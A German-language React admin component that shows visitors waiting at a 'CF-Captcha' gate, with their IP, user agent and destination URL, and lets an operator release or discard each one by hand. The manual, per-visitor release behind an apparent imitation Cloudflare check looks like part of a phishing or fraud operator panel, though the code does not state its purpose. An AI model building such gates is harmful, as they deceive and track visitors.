import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { ShieldCheck, Check, Trash2 } from "lucide-react";
import DeviceInfo from "./DeviceInfo";
import { toast } from "sonner";

interface Row {
  id: string;
  next_url: string | null;
  client_ua: string | null;
  client_ip: string | null;
  released_at: string | null;
  slider_released_at: string | null;
  created_at: string;
}

const CaptchaGateCard = () => {
  const [rows, setRows] = useState<Row[]>([]);

  const load = async () => {
    const since = new Date(Date.now() - 1000 * 60 * 60 * 6).toISOString();
    const { data } = await (supabase as any)
      .from("captcha_requests")
      .select("*")
      .is("slider_released_at", null)
      .gte("created_at", since)
      .order("created_at", { ascending: false });
    setRows(data || []);
  };

  useEffect(() => {
    load();
    const ch = (supabase as any)
      .channel("captcha_requests_admin")
      .on("postgres_changes", { event: "*", schema: "public", table: "captcha_requests" }, load)
      .subscribe();
    const iv = setInterval(load, 5000);
    return () => { (supabase as any).removeChannel(ch); clearInterval(iv); };
  }, []);

  const releaseSlider = async (id: string) => {
    const now = new Date().toISOString();
    const { error } = await (supabase as any)
      .from("captcha_requests")
      .update({ slider_released_at: now, released_at: now })
      .eq("id", id);
    if (error) toast.error(error.message);
    else toast.success("Schieberegler freigegeben");
  };


  const remove = async (id: string) => {
    await (supabase as any).from("captcha_requests").delete().eq("id", id);
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <ShieldCheck className="h-4 w-4" /> CF-Captcha Freigaben
          {rows.length > 0 && (
            <span className="ml-2 text-xs bg-primary text-primary-foreground rounded-full px-2 py-0.5">{rows.length}</span>
          )}
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-3">
        {rows.length === 0 && (
          <p className="text-sm text-muted-foreground">
            Keine wartenden Kunden. Sobald ein Kunde die Captcha-Checkbox anklickt, erscheint hier eine Freigabe.
          </p>
        )}
        {rows.map(r => (
          <div key={r.id} className="border rounded-md p-3 space-y-2">
            <div className="text-xs text-muted-foreground">
              {new Date(r.created_at).toLocaleString("de-DE", { timeZone: "Europe/Berlin" })}
            </div>
            {r.next_url && (
              <div className="text-xs break-all"><span className="font-medium">Ziel:</span> {r.next_url}</div>
            )}
            <DeviceInfo ua={r.client_ua} ip={r.client_ip} seenAt={r.created_at} />
            <div className="flex flex-wrap gap-2">
              <Button size="sm" onClick={() => releaseSlider(r.id)} className="gap-1">
                <Check className="h-4 w-4" />Schieberegler freigeben
              </Button>
              <Button size="sm" variant="outline" onClick={() => remove(r.id)} className="gap-1">
                <Trash2 className="h-4 w-4" />Verwerfen
              </Button>
            </div>
          </div>
        ))}

      </CardContent>
    </Card>
  );
};

export default CaptchaGateCard;
